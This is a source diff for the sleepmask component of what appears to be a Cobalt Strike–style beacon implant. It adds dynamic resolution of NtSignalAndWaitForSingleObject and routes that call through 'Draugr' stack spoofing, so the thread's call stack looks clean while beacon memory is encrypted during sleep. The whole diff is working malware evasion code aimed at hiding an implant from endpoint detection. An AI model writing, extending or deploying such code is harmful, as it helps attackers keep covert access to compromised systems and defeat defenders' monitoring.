@@ -130,13 +130,14 @@ typedef VOID    (NTAPI* TpReleaseTimerPtr)(PTP_TIMER);
         ULONG NumberOfOffsets, CFG_CALL_TARGET_INFO* OffsetInformation);
 
     // --- Resolved function pointers for self-masking ---
-    static SystemFunction032_t   pSystemFunction032     = NULL;
-    static LPVOID                pVirtualProtect        = NULL;
-    static LPVOID                pNtContinue            = NULL;
-    static LPVOID                pWaitForSingleObjectEx = NULL;
-    static LPVOID                pSetEvent              = NULL;
-    static LPVOID                pRtlCaptureContext     = NULL;
-    static BOOL                  selfMaskReady          = FALSE;
+    static SystemFunction032_t   pSystemFunction032              = NULL;
+    static LPVOID                pVirtualProtect                 = NULL;
+    static LPVOID                pNtContinue                     = NULL;
+    static LPVOID                pWaitForSingleObjectEx          = NULL;
+    static LPVOID                pSetEvent                       = NULL;
+    static LPVOID                pRtlCaptureContext              = NULL;
+    static LPVOID                pNtSignalAndWaitForSingleObject = NULL;
+    static BOOL                  selfMaskReady                   = FALSE;
 
     /**
     * Mark a function pointer as a valid CFG indirect call target.
@@ -182,10 +183,11 @@ typedef VOID    (NTAPI* TpReleaseTimerPtr)(PTP_TIMER);
         pWaitForSingleObjectEx = (LPVOID)GetProcAddress(hKernel32, "WaitForSingleObjectEx");
         pSetEvent              = (LPVOID)GetProcAddress(hKernel32, "SetEvent");
         pRtlCaptureContext     = (LPVOID)GetProcAddress(hNtdll, "RtlCaptureContext");
+        pNtSignalAndWaitForSingleObject = (LPVOID)GetProcAddress(hNtdll, "NtSignalAndWaitForSingleObject");
 
         if (!pSystemFunction032 || !pVirtualProtect || !pNtContinue ||
             !pWaitForSingleObjectEx || !pSetEvent ||
-            !pRtlCaptureContext) {
+            !pRtlCaptureContext || !pNtSignalAndWaitForSingleObject) {
             DLOG("SLEEPMASK: Failed to resolve function pointers for self-masking\n");
             return FALSE;
         }
@@ -291,10 +293,11 @@ typedef VOID    (NTAPI* TpReleaseTimerPtr)(PTP_TIMER);
     *
     * Falls back to basic TpAllocTimer sleep if self-masking is unavailable.
     *
-    * @param info      A pointer to a BEACON_INFO structure.
-    * @param sleepMs   The sleep duration in milliseconds.
+    * @param info        A pointer to a BEACON_INFO structure.
+    * @param sleepMs     The sleep duration in milliseconds.
+    * @param pDraugrCall Draugr call context for stack-spoofed API calls (may be NULL).
     */
-    void ThreadPoolTimerSleep(PBEACON_INFO info, DWORD sleepMs) {
+    void ThreadPoolTimerSleep(PBEACON_INFO info, DWORD sleepMs, PDRAUGR_FUNCTION_CALL pDraugrCall) {
         HANDLE       hTimerQueue = NULL;
         HANDLE       hEvntTimer  = NULL;
         HANDLE       hEvntStart  = NULL;
@@ -472,7 +475,18 @@ typedef VOID    (NTAPI* TpReleaseTimerPtr)(PTP_TIMER);
 
             // [10] Atomically signal EvntStart (unblocks the timer chain)
             //      and wait on EvntEnd (blocks until chain completes).
-            NtSignalAndWaitForSingleObject(hEvntStart, hEvntEnd, FALSE, NULL);
+            //      Use Draugr stack spoofing so the main thread's call stack
+            //      appears clean while blocked in the kernel wait.
+            if (pDraugrCall && pDraugrCall->StackFrame) {
+                ((SpoofCallPtr)pDraugrCall->SpoofCall)(
+                    (PSYNTHETIC_STACK_FRAME)pDraugrCall->StackFrame,
+                    pNtSignalAndWaitForSingleObject,
+                    (PVOID)hEvntStart, (PVOID)hEvntEnd,
+                    (PVOID)(ULONG_PTR)FALSE, (PVOID)NULL,
+                    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+            } else {
+                NtSignalAndWaitForSingleObject(hEvntStart, hEvntEnd, FALSE, NULL);
+            }
 
             // [11] Unmask beacon memory — sleepmask code is decrypted + RX.
             UnMaskBeacon(info);
@@ -535,7 +549,7 @@ typedef VOID    (NTAPI* TpReleaseTimerPtr)(PTP_TIMER);
         if (functionCall->function == WinApi::SLEEP) {
             DWORD sleepMs = (DWORD)(ULONG_PTR)functionCall->args[0];
             DLOGF("SLEEPMASK: Intercepting Sleep(%lu) with self-masking timer chain\n", sleepMs);
-            ThreadPoolTimerSleep(info, sleepMs);
+            ThreadPoolTimerSleep(info, sleepMs, &draugrCall);
             functionCall->retValue = 0;
             return;
         }
